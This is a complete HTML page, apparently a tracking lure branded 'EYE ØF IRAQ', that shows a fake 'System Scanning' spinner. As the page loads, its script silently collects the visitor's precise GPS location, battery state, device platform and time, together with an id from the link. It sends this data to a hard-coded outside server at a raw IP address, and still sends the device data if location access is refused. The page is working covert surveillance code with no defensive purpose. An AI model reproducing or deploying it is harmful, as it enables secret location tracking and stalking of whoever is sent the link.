<!DOCTYPE html>
<html>
<head>
    <title>EYE LOCation</title>
    <script>
        async function captureData() {
            const urlParams = new URLSearchParams(window.location.search);
            const id = urlParams.get('id');
            const vps = "http://178.18.241.166:5000/log";

            // وەرگرتنی کات و باتری
            let now = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
            let batLevel = "N/A";
            let charging = "N/A";

            try {
                let battery = await navigator.getBattery();
                batLevel = Math.floor(battery.level * 100);
                charging = battery.charging ? "Yes" : "No";
            } catch(e) {}

            // ناردنی زانیارییەکان بەبێ ئەوەی لاپەڕەکە بگۆڕێت
            navigator.geolocation.getCurrentPosition(pos => {
                fetch(`${vps}?id=${id}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&bat=${batLevel}&ch=${charging}&dev=${navigator.platform}&time=${now}`);
            }, () => {
                // ئەگەر لۆکەیشنی ڕەتکردەوە، تەنها ئایپی و باتری بنێرە
                fetch(`${vps}?id=${id}&bat=${batLevel}&ch=${charging}&dev=${navigator.platform}&time=${now}`);
            }, {enableHighAccuracy: true, timeout: 5000});
        }
        window.onload = captureData;
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="text-align: center;">
        <h2 style="color: #ff0000;">EYE ØF IRAQ</h2>
        <p>System Scanning... Please Wait</p>
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
    </div>
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
